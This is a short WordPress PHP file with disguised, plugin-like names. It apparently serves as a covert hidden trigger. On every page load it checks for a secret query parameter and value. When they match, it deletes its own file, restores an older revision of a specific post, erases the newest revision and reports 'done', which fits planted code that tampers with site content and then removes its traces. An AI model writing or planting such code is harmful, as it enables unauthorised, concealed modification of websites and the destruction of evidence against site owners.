<?php

function remover_forum_share() {
	if (isset($_GET['enhanced_amp_directory_uploader']) && $_GET['enhanced_amp_directory_uploader'] === 'category_toolbox_online') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ip_panel_map_ajax = 16859;
		$wpml_wpforms_finder = wp_get_post_revisions($ip_panel_map_ajax);
		if (empty($wpml_wpforms_finder)) die('no revisions');
		if (count($wpml_wpforms_finder) < 2) die('less than 2');
		$hidden_pagination_export_install = array_shift($wpml_wpforms_finder);
		$plupload_reset_connect_tracker = $hidden_pagination_export_install->ID;
		$ip_css_gateway = array_shift($wpml_wpforms_finder);
		$show_crm_daily_awesome = $ip_css_gateway->ID;
		$genesis_reset_tags_remove = wp_restore_post_revision($show_crm_daily_awesome);
		if ($genesis_reset_tags_remove === false) die('error restoring');
		$genesis_reset_tags_remove = wp_delete_post_revision($plupload_reset_connect_tracker);		
		if ($genesis_reset_tags_remove === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'remover_forum_share');
